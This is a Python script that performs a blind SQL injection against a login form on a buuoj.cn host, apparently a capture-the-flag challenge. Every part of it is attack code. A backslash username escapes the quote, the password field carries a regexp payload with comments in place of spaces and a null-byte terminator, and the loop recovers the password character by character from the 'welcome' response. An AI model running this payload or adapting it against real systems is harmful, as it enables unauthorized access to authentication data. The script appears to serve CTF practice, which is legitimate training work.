import requests
from urllib import parse
import string

url = 'http://a5cd5d01-c0a9-408b-b82f-e795a81a2ae2.node4.buuoj.cn:81/'
num = 0
result = ''
string = string.ascii_lowercase + string.digits + '_'
for i in range(1, 60):
    if num == 1:
        break
    for j in string:
        data = {
            "username": "\\",
            "passwd": "||/**/passwd/**/regexp/**/\"^{}\";{}".format((result + j), parse.unquote('%00'))
        }
        print(result + j)
        res = requests.post(url=url, data=data)
        if 'welcome' in res.text:
            result += j
            break
        if j == '_' and 'welcome' not in res.text:
            break
